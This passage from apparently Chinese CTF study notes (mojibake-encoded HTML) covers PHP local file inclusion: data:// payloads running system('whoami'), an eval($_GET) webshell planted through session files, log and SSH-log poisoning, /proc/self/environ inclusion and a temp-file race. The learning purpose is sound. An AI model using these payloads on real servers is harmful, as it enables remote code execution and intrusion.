·ç±»ä¼¼ä¸php:&#x2F;&#x2F;inputï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data:&#x2F;&#x2F;æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><p>åˆ©ç”¨data:&#x2F;&#x2F; ä¼ªåè®®å¯ä»¥ç›´æ¥è¾¾åˆ°æ‰§è¡Œphpä»£ç çš„æ•ˆæœï¼Œä¾‹å¦‚æ‰§è¡Œphpinfo()å‡½æ•°ï¼š</p><p>åˆ©ç”¨æ¡ä»¶:</p><ol><li><p>phpç‰ˆæœ¬å¤§äºç­‰äºphp5.2</p></li><li><p>allow_url_fopen ï¼šon</p></li><li><p>allow_url_includeï¼šon</p></li></ol><p>å§¿åŠ¿ä¸€ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">index.php?file=data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">index.php?file=data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å§¿åŠ¿äºŒï¼š</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-built_in">index</span>.php?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">data</span>:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%<span class="hljs-number">2</span>b<br></code></pre></td></tr></table></figure><p>åŠ å·<code>+</code>çš„urlç¼–ç ä¸º<code>%2b</code>ï¼Œ<code>PD9waHAgcGhwaW5mbygpOz8+</code>çš„base64è§£ç ä¸ºï¼š<code>&lt;?php phpinfo();?&gt;</code></p><p>æ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-built_in">index</span>.php?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">data</span>:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==<br></code></pre></td></tr></table></figure><p>å…¶ä¸­<code>PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</code>çš„base64è§£ç ä¸ºï¼š<code>&lt;?php system(&#39;whoami&#39;);?&gt;</code></p><h3 id="sessionæ–‡ä»¶åŒ…å«"><a href="#sessionæ–‡ä»¶åŒ…å«" class="headerlink" title="sessionæ–‡ä»¶åŒ…å«"></a>sessionæ–‡ä»¶åŒ…å«</h3><p>åˆ©ç”¨æ¡ä»¶ï¼šsessionæ–‡ä»¶è·¯å¾„å·²çŸ¥ï¼Œä¸”å…¶ä¸­å†…å®¹éƒ¨åˆ†å¯è¯»å†™ã€‚</p><p>å§¿åŠ¿ï¼š</p><p>phpçš„sessionæ–‡ä»¶çš„ä¿å­˜è·¯å¾„å¯ä»¥åœ¨phpinfoçš„session.save_pathçœ‹åˆ°</p><p>å¸¸è§çš„php-sessionå­˜æ”¾ä½ç½®ï¼š</p><ol><li>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID</li><li>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID</li><li>&#x2F;tmp&#x2F;sess_PHPSESSID</li><li>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID</li></ol><p>sessionçš„æ–‡ä»¶åæ ¼å¼ä¸ºsess_[phpsessid]ã€‚è€Œphpsessidåœ¨å‘é€çš„è¯·æ±‚çš„cookieå­—æ®µä¸­å¯ä»¥çœ‹åˆ°ã€‚</p><p>è¦åŒ…å«å¹¶åˆ©ç”¨çš„è¯ï¼Œéœ€è¦èƒ½æ§åˆ¶éƒ¨åˆ†sesssionæ–‡ä»¶çš„å†…å®¹ã€‚æš‚æ—¶æ²¡æœ‰é€šç”¨çš„åŠæ³•ã€‚æœ‰äº›æ—¶å€™ï¼Œå¯ä»¥å…ˆåŒ…å«è¿›sessionæ–‡ä»¶ï¼Œè§‚å¯Ÿé‡Œé¢çš„å†…å®¹ï¼Œç„¶åæ ¹æ®é‡Œé¢çš„å­—æ®µæ¥å‘ç°å¯æ§çš„å˜é‡ï¼Œä»è€Œåˆ©ç”¨å˜é‡æ¥å†™å…¥payloadï¼Œå¹¶ä¹‹åå†æ¬¡åŒ…å«ä»è€Œæ‰§è¡Œphpä»£ç .</p><h4 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h4><p>é¢˜ç›®ï¼š<a href="https://chybeta.github.io/2017/11/09/%E4%B8%80%E9%81%93CTF%E9%A2%98%EF%BC%9APHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">ä¸€é“CTFé¢˜ï¼šPHPæ–‡ä»¶åŒ…å« | Chybeta</a></p><p>é¦–å…ˆç”¨php:&#x2F;&#x2F;filterä¼ªåè®®è¯»å–åˆ°ä»£ç ï¼Œ</p><p>é¢˜ç›®æ¶‰åŠåˆ°ç™»é™†æ³¨å†Œç•Œé¢ï¼Œå…ˆè€ƒè™‘sqlæ³¨å…¥ï¼Œå¾€å¾€æ³¨å†Œä¸ç™»é™†æ“ä½œä¸­ä¼šæœ‰ä¸æ•°æ®åº“äº¤äº’çš„åœ°æ–¹ä¹Ÿæ˜¯sqlæ³¨å…¥çš„å¸¸è§å¼•å‘ç‚¹ã€‚</p><p>register.phpæºä»£ç </p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta"># register.php</span><br><br>$mysqli-&gt;set_charset(<span class="hljs-string">&quot;utf8&quot;</span>)<span class="hljs-comment">;</span><br>$sql = <span class="hljs-string">&quot;select * from user where username=?&quot;</span><span class="hljs-comment">;</span><br>$stmt = $mysqli-&gt;prepare($sql)<span class="hljs-comment">;</span><br>$stmt-&gt;bind_param(<span class="hljs-string">&quot;s&quot;</span>, $username)<span class="hljs-comment">;</span><br>$stmt-&gt;bind_result($res_id, $res_username, $res_password)<span class="hljs-comment">;</span><br>$stmt-&gt;<span class="hljs-built_in">execute</span>()<span class="hljs-comment">;</span><br>$stmt-&gt;store_result()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>å†çœ‹ä¸€ä¸‹login.phpæºä»£ç </p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta"># login.php</span><br><br>$sql = <span class="hljs-string">&quot;select password from user where username=?&quot;</span><span class="hljs-comment">;</span><br>$stmt = $mysqli-&gt;prepare($sql)<span class="hljs-comment">;</span><br>$stmt-&gt;bind_param(<span class="hljs-string">&quot;s&quot;</span>, $username)<span class="hljs-comment">;</span><br>$stmt-&gt;bind_result($res_password)<span class="hljs-comment">;</span><br>$stmt-&gt;<span class="hljs-built_in">execute</span>()<span class="hljs-comment">;</span><br>$stmt-&gt;fetch()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>æ•°æ®åº“è¿æ¥éƒ¨åˆ†ä½¿ç”¨äº†mysqlié¢„å¤„ç†ã€‚</p><p>åªè¦ç”¨äº† <strong>é¢„å¤„ç†è¯­å¥ï¼ˆprepare + bind_param&#x2F;executeï¼‰</strong>ï¼Œå°±èƒ½å¤§å¹…é™ä½ SQL æ³¨å…¥é£é™©ã€‚</p><p>æ¥ç€å†çœ‹çœ‹ï¼Œæœ‰å“ªäº›å‚æ•°æ˜¯å¯æ§çš„ã€‚</p><p>åœ¨login.phpä¸­ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># ç¬¬3è¡Œ</span><br>session_start();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &#123;<br>header(<span class="hljs-string">&#x27;Location: index.php&#x27;</span>);<br><span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-comment"># ç¬¬8è¡Œ</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><br><span class="hljs-comment"># ç¬¬20è¡Œ</span><br><span class="hljs-variable">$stmt</span>-&gt;bind_result(<span class="hljs-variable">$res_password</span>);<br><span class="hljs-comment"># ç¬¬24è¡Œ</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$res_password</span> == <span class="hljs-variable">$password</span>) &#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = base64_encode(<span class="hljs-variable">$username</span>);<br>header(<span class="hljs-string">&quot;location:index.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨äº†sessionæ¥ä¿å­˜ç”¨æˆ·ä¼šè¯</p><p>å˜é‡<code>$username</code>æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œå¹¶ä¸”è¢«è®¾ç½®åˆ°äº†<code>$_SESSION</code>ä¸­ï¼Œå› æ­¤æˆ‘ä»¬è¾“å…¥çš„æ•°æ®æœªç»è¿‡æ»¤çš„å°±è¢«å†™å…¥åˆ°äº†å¯¹åº”çš„sessioinæ–‡ä»¶ä¸­ã€‚ç»“åˆå‰é¢çš„phpæ–‡ä»¶åŒ…å«ï¼Œå¯ä»¥æ¨æµ‹è¿™é‡Œå¯ä»¥åŒ…å«sessionæ–‡ä»¶</p><p>è¦åŒ…å«sessionæ–‡ä»¶ï¼Œéœ€è¦çŸ¥é“æ–‡ä»¶çš„è·¯å¾„ã€‚å¸¸è§çš„php-sessionå­˜æ”¾ä½ç½®åœ¨å‰æ–‡å·²ç»åˆ—ä¸¾è¿‡äº†ã€‚</p><p>èƒ½åŒ…å«ï¼Œå¹¶ä¸”æ§åˆ¶sessionæ–‡ä»¶ï¼Œä½†è¦å†™å…¥å¯ç”¨çš„payloadï¼Œè¿˜éœ€è¦ç»•è¿‡ï¼š</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$_SESSION[<span class="hljs-string">&#x27;username&#x27;</span>] = base64_encode($username)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>è¾“å…¥çš„ç”¨æˆ·åä¼šè¢«base64åŠ å¯†ã€‚å¦‚æœç›´æ¥ç”¨phpä¼ªåè®®æ¥è§£å¯†æ•´ä¸ªsessionæ–‡ä»¶ï¼Œç”±äºåºåˆ—åŒ–çš„å‰ç¼€ï¼ŒåŠ¿å¿…å¯¼è‡´ä¹±ç ã€‚</p><p>è€ƒè™‘ä¸€ä¸‹base64çš„ç¼–ç è¿‡ç¨‹ã€‚æ¯”å¦‚ç¼–ç abcã€‚</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">æœªç¼–ç : abc<br>è½¬æˆasciiç ï¼š <span class="hljs-number">97</span> <span class="hljs-number">98</span> <span class="hljs-number">99</span><br>è½¬æˆå¯¹åº”äºŒè¿›åˆ¶ï¼ˆä¸‰ç»„ï¼Œæ¯ç»„<span class="hljs-number">8</span>ä½ï¼‰ï¼š <span class="hljs-number">01100001</span> <span class="hljs-number">01100010</span> <span class="hljs-number">01100011</span><br>é‡åˆ†ç»„ï¼ˆå››ç»„ï¼Œæ¯ç»„<span class="hljs-number">6</span>ä½ï¼‰ï¼š <span class="hljs-number">011000</span> <span class="hljs-number">010110</span> <span class="hljs-number">001001</span> <span class="hljs-number">100011</span><br>æ¯ç»„é«˜ä½è¡¥é›¶ï¼Œå˜ä¸ºæ¯ç»„<span class="hljs-number">8</span>ä½ï¼š<span class="hljs-number">00011000</span> <span class="hljs-number">00010110</span> <span class="hljs-number">00001001</span> <span class="hljs-number">00100011</span><br>æ¯ç»„å¯¹åº”è½¬ä¸ºåè¿›åˆ¶ï¼š <span class="hljs-number">24 22 9 35</span><br>æŸ¥è¡¨å¾—ï¼š Y W J j<br></code></pre></td></tr></table></figure><p>PHP åœ¨ä¿å­˜åˆ° session æ–‡ä»¶æ—¶ä¼šåºåˆ—åŒ–æˆï¼š</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">username<span class="hljs-string">|s:12:&quot;</span>QUJDREVGR0g<span class="hljs-punctuation">=</span><span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure><ul><li><code>username|s:12:&quot;</code> â†’ è¿™æ˜¯ <strong>å‰ç¼€</strong>ï¼Œæè¿°é”®åå’Œå­—ç¬¦ä¸²é•¿åº¦ã€‚</li><li><code>QUJDREVGR0g=</code> â†’ è¿™æ˜¯ base64 ç¼–ç åçš„å†…å®¹ã€‚</li><li><code>&quot;;</code> â†’ ç»“æŸç¬¦ã€‚</li></ul><p>è€ƒè™‘ä¸€ä¸‹sessionçš„å‰ç¼€ï¼š<code>username|s:12:&quot;</code>ï¼Œä¸­é—´çš„æ•°å­—12è¡¨ç¤ºåé¢base64ä¸²çš„é•¿åº¦ã€‚å½“base64ä¸²çš„é•¿åº¦å°äº100æ—¶ï¼Œå‰ç¼€çš„é•¿åº¦å›ºå®šä¸º15ä¸ªå­—ç¬¦ï¼Œå½“base64ä¸²çš„é•¿åº¦å¤§äº100å°äº1000æ—¶ï¼Œå‰ç¼€çš„é•¿åº¦å›ºå®šä¸º16ä¸ªå­—ç¬¦ã€‚</p><p>ç”±äº16ä¸ªå­—ç¬¦ï¼Œæ°å¥½æ»¡è¶³ä¸€ä¸‹æ¡ä»¶ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">16</span>ä¸ªå­—ç¬¦ =&gt; <span class="hljs-number">16</span> * <span class="hljs-number">6</span> = <span class="hljs-number">96</span> ä½ =&gt; <span class="hljs-number">96</span> mod <span class="hljs-number">8</span> = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>å†è§£é‡Šä¸€ä¸‹ä¸Šé¢çš„å¼å­ï¼š </p><ul><li>åŸå§‹æ•°æ®æ˜¯æŒ‰ <strong>8 ä½ï¼ˆ1å­—èŠ‚ï¼‰</strong>å­˜å‚¨çš„ã€‚</li><li>Base64 ç¼–ç æ—¶ï¼ŒæŠŠåŸå§‹æ¯”ç‰¹æµåˆ‡æˆ <strong>6 ä½ä¸€ç»„</strong>ã€‚</li><li>æ¯ä¸€ç»„ 6 ä½å†æ˜ å°„æˆä¸€ä¸ª Base64 å­—ç¬¦ã€‚</li></ul><p>æ‰€ä»¥ï¼Œ<strong>1 ä¸ª Base64 å­—ç¬¦ä»£è¡¨ 6 ä½ä¿¡æ¯</strong>ã€‚</p><p>åŸå§‹æ•°æ®æ˜¯æŒ‰å­—èŠ‚ï¼ˆ8 ä½ï¼‰å­˜å‚¨çš„ï¼Œä½†ç¼–ç ç»“æœæ˜¯æŒ‰ 6 ä½åˆ†ç»„çš„ã€‚<br> ä¸ºäº†ä¸ä¸¢ä¿¡æ¯ï¼ŒBase64 è¦ä¿è¯ï¼š</p><blockquote><p>ç”¨ N ä¸ª 6 ä½åˆ†ç»„æ‹¼èµ·æ¥æ—¶ï¼Œèƒ½æ­£å¥½è¦†ç›–æŸä¸ªæ•´æ•°ä¸ªå­—èŠ‚ï¼ˆ8 ä½ä¸€ç»„ï¼‰ã€‚</p></blockquote><p>è¿™å°±ç­‰ä»·äºï¼š<br>$$<br>NÃ—6â‰¡0(mod8)N<br>$$</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“å¯¹sessionæ–‡ä»¶è¿›è¡Œbase64è§£å¯†æ—¶ï¼Œå‰16ä¸ªå­—ç¬¦å›ºç„¶è¢«è§£å¯†ä¸ºä¹±ç ï¼Œä½†ä¸ä¼šå†å½±å“ä»ç¬¬17ä¸ªå­—ç¬¦åçš„éƒ¨åˆ†ä¹Ÿå°±æ˜¯base64åŠ å¯†åçš„usernameã€‚</p><p><strong>Get Flag</strong></p><p>æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">chybetachybetachybetachybetachybetachybetachybetachybetachybeta<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;atebyhc&#x27;</span>]) <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å…¶base64åŠ å¯†åçš„é•¿åº¦ä¸º128ï¼Œå¤§äº100ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">54.222</span>.<span class="hljs-number">188.152</span>:<span class="hljs-number">22589</span>/index.php<br>?action=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-decode/</span>resource=<span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/php5/</span>sess_udu8pr09fjvabtoip8icgurt85<br>&amp;atebyhc=phpinfo();<br></code></pre></td></tr></table></figure><h3 id="åŒ…å«æ—¥å¿—"><a href="#åŒ…å«æ—¥å¿—" class="headerlink" title="åŒ…å«æ—¥å¿—"></a>åŒ…å«æ—¥å¿—</h3><h4 id="è®¿é—®æ—¥å¿—"><a href="#è®¿é—®æ—¥å¿—" class="headerlink" title="è®¿é—®æ—¥å¿—"></a>è®¿é—®æ—¥å¿—</h4><p>åˆ©ç”¨æ¡ä»¶ï¼š éœ€è¦çŸ¥é“æœåŠ¡å™¨æ—¥å¿—çš„å­˜å‚¨è·¯å¾„ï¼Œä¸”æ—¥å¿—æ–‡ä»¶å¯è¯»ã€‚</p><p>å§¿åŠ¿ï¼š</p><p>å¾ˆå¤šæ—¶å€™ï¼ŒwebæœåŠ¡å™¨ä¼šå°†è¯·æ±‚å†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œæ¯”å¦‚è¯´apacheã€‚</p><p><img src="D:\work\temp\PixPin_2025-09-09_19-28-40.png" alt="PixPin_2025-09-09_19-28-40"></p><p>åœ¨ç”¨æˆ·å‘èµ·è¯·æ±‚æ—¶ï¼Œä¼šå°†è¯·æ±‚å†™å…¥access.logï¼Œå½“å‘ç”Ÿé”™è¯¯æ—¶å°†é”™è¯¯å†™å…¥error.logã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ—¥å¿—ä¿å­˜è·¯å¾„åœ¨ &#x2F;var&#x2F;log&#x2F;apache2&#x2F;ã€‚</p><p>ä½†å¦‚æœæ˜¯ç›´æ¥å‘èµ·è¯·æ±‚ï¼Œä¼šå¯¼è‡´ä¸€äº›ç¬¦å·è¢«ç¼–ç ä½¿å¾—åŒ…å«æ— æ³•æ­£ç¡®è§£æã€‚å¯ä»¥ä½¿ç”¨burpæˆªåŒ…åä¿®æ”¹ã€‚</p><p>æ­£å¸¸çš„phpä»£ç å·²ç»å†™å…¥äº† &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.logã€‚ç„¶åè¿›è¡ŒåŒ…å«å³å¯ã€‚</p><p>åœ¨ä¸€äº›åœºæ™¯ä¸­ï¼Œlogçš„åœ°å€æ˜¯è¢«ä¿®æ”¹æ‰çš„ã€‚ä½ å¯ä»¥é€šè¿‡è¯»å–ç›¸åº”çš„é…ç½®æ–‡ä»¶åï¼Œå†è¿›è¡ŒåŒ…å«ã€‚</p><h4 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h4><p>åˆ©ç”¨æ¡ä»¶ï¼šéœ€è¦çŸ¥é“ssh-logçš„ä½ç½®ï¼Œä¸”å¯è¯»ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸º &#x2F;var&#x2F;log&#x2F;auth.log</p><p>å§¿åŠ¿ï¼š</p><p>ç”¨sshè¿æ¥ï¼š</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">ubuntu@VM-207-93-ubuntu:~$ ssh &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;@remotehost</span><br></code></pre></td></tr></table></figure><p>ä¹‹åä¼šæç¤ºè¾“å…¥å¯†ç ç­‰ç­‰ï¼Œéšä¾¿è¾“å…¥ã€‚</p><p>ç„¶ååœ¨remotehostçš„ssh-logä¸­å³å¯å†™å…¥phpä»£ç ï¼š</p><p>ä¹‹åè¿›è¡Œæ–‡ä»¶åŒ…å«å³å¯ã€‚</p><h4 id="åŒ…å«fd"><a href="#åŒ…å«fd" class="headerlink" title="åŒ…å«fd"></a>åŒ…å«fd</h4><p>å› ä¸º Apache çš„æ—¥å¿—ï¼ˆæ¯”å¦‚é”™è¯¯æ—¥å¿—ï¼‰é‡Œä¼šè®°å½•ä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚è¯·æ±‚å¤´ã€‚<br> æ‰€ä»¥æ”»å‡»è€…å¯ä»¥æŠŠä¸€æ®µ PHP ä»£ç ï¼ˆæ¯”å¦‚ <code>&lt;?php ... ?&gt;</code>ï¼‰å¡è¿› <strong>Referer è¯·æ±‚å¤´</strong>ï¼Œè¿™æ ·æ—¥å¿—æ–‡ä»¶é‡Œå°±ä¼šå‡ºç°è¿™æ®µä»£ç ã€‚</p><p>å¦‚æœç½‘ç«™æœ‰ LFI æ¼æ´ï¼Œå¯ä»¥è®©å®ƒâ€œåŒ…å«â€æ—¥å¿—æ–‡ä»¶ï¼Œé‚£ä¹ˆæ—¥å¿—é‡Œçš„ PHP ä»£ç å°±ä¼šè¢«æ‰§è¡Œã€‚</p><p>åŒ…å« <strong>Apache é”™è¯¯æ—¥å¿—ä¿¡æ¯</strong> çš„ proc æ–‡ä»¶ä¼šåœ¨ <strong>&#x2F;proc&#x2F;self&#x2F;fd&#x2F;</strong> ä¸‹å˜åŒ–ï¼Œä¾‹å¦‚ <strong>&#x2F;proc&#x2F;self&#x2F;fd&#x2F;2</strong>ã€**&#x2F;proc&#x2F;self&#x2F;fd&#x2F;10** ç­‰ã€‚</p><h4 id="åŒ…å«environ"><a href="#åŒ…å«environ" class="headerlink" title="åŒ…å«environ"></a>åŒ…å«environ</h4><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ol><li>phpä»¥cgiæ–¹å¼è¿è¡Œï¼Œè¿™æ ·environæ‰ä¼šä¿æŒUAå¤´ã€‚</li><li>environæ–‡ä»¶å­˜å‚¨ä½ç½®å·²çŸ¥ï¼Œä¸”environæ–‡ä»¶å¯è¯»ã€‚</li></ol><p>å§¿åŠ¿ï¼š</p><p>proc&#x2F;self&#x2F;environä¸­ä¼šä¿å­˜user-agentå¤´ã€‚å¦‚æœåœ¨user-agentä¸­æ’å…¥phpä»£ç ï¼Œåˆ™phpä»£ç ä¼šè¢«å†™å…¥åˆ°environä¸­ã€‚ä¹‹åå†åŒ…å«å®ƒï¼Œå³å¯ã€‚</p><h3 id="åŒ…å«ä¸´æ—¶æ–‡ä»¶"><a href="#åŒ…å«ä¸´æ—¶æ–‡ä»¶" class="headerlink" title="åŒ…å«ä¸´æ—¶æ–‡ä»¶"></a>åŒ…å«ä¸´æ—¶æ–‡ä»¶</h3><p>phpä¸­ä¸Šä¼ æ–‡ä»¶ï¼Œä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚åœ¨linuxä¸‹ä½¿ç”¨&#x2F;tmpç›®å½•ï¼Œè€Œåœ¨windowsä¸‹ä½¿ç”¨c:\winsdows\tempç›®å½•ã€‚åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰ï¼Œåˆ©ç”¨ç«äº‰å³å¯åŒ…å«è¯¥ä¸´æ—¶æ–‡ä»¶ã€‚</p><p>ç”±äºåŒ…å«éœ€è¦çŸ¥é“åŒ…å«çš„æ–‡ä»¶åã€‚ä¸€ç§æ–¹æ³•æ˜¯è¿›è¡Œæš´åŠ›çŒœè§£ï¼Œlinuxä¸‹ä½¿ç”¨çš„éšæœºå‡½æ•°æœ‰ç¼ºé™·ï¼Œè€Œwindowä¸‹åªæœ‰65535ä¸­ä¸åŒçš„æ–‡ä»¶åï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ˜¯å¯è¡Œçš„ã€‚</p><p>å¦ä¸€ç§æ–¹æ³•æ˜¯é…åˆphpinfoé¡µé¢çš„php variablesï¼Œå¯ä»¥ç›´æ¥è·å–åˆ°ä¸Šä¼ æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„å’Œä¸´æ—¶æ–‡ä»¶åï¼Œç›´æ¥åŒ…å«å³å¯ã€‚</p><h4 id="ä¾‹é¢˜-1"><a href="#ä¾‹é¢˜-1" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h4><p><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/">XMANå¤ä»¤è¥-2017-babyweb-writeup | Chybeta</a></p><p>é¢˜ç›®è¦æ±‚ä¸Šä¼ åç¼€ä¸º<code>.gif</code>æˆ–è€…<code>.jpg</code>çš„æ–‡ä»¶ï¼Œå®ƒå…ˆå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åˆ°uploadsæ–‡ä»¶å¤¹ä¸‹ï¼Œç„¶åsleep(2)ï¼Œæ¥ç€è°ƒç”¨imagecreatefromgifç­‰ä¸€ç³»åˆ—æ“ä½œã€‚å¦‚æœæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªåŒ…å«phpä»£ç çš„å›¾ç‰‡æœ¨é©¬ï¼Œåœ¨ç»è¿‡imagecreatefromgifç­‰ä¸€ç³»åˆ—æ“ä½œåï¼Œæ­£å¸¸æƒ…å†µä¸‹å…¶ä¸­çš„phpä»£ç ä¼šè¢«å»æ‰ï¼Œä¹Ÿå°±æ˜¯è¯´æ“ä½œè¿‡åçš„å›¾ç‰‡å·²ç»ä¸æ˜¯å›¾ç‰‡æœ¨é©¬äº†ã€‚ä¸è¿‡ç”±äºå­˜åœ¨sleep(2)ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªä¸¤ç§’çš„ç©ºéš™ï¼Œåˆ©ç”¨pharæˆ–è€…zipåè®®å»åŒ…å«æˆ‘ä»¬ä¸Šä¼ çš„è¿˜æœªè¢«åˆ é™¤çš„å›¾ç‰‡æœ¨é©¬ã€‚</p><p><img src="D:\work\notebook\ontebook\CTF\webå­¦ä¹ \æ–‡ä»¶åŒ…å«æ¼æ´\assets\PixPin_2025-09-10_21-42-06.png" alt="PixPin_2025-09-10_21-42-06"></p><p>ä»ä¸Šæ–‡ä¸­åˆ©ç”¨pharæˆ–è€…zipåè®®çš„æ–¹æ³•ï¼Œæ˜¾ç„¶æˆ‘ä»¬éœ€è¦æŠŠä¸€å¥è¯æœ¨é©¬å‹ç¼©ä¸º.zipã€‚</p><p>ä¸Šä¼ æ—¶å°†å…¶æ–‡ä»¶åæ”¹ä¸ºk.jpgï¼Œç±»å‹æ”¹ä¸ºimage&#x2F;jpegã€‚åœ¨ä¸Šä¼ åè®¿é—®<code>http://202.112.51.217:8199/uploads/</code>ï¼Œå»è·å–æœ€æ–°çš„æ–‡ä»¶åï¼Œç„¶åç”¨åè®®å»åŒ…å«ã€‚å¦‚æœæ‰‹åŠ¨çš„è¯æ—¶é—´è‚¯å®šä¼šè¶…è¿‡2sï¼Œæ‰€ä»¥éœ€è¦ç”¨è„šæœ¬ã€‚</p><h2 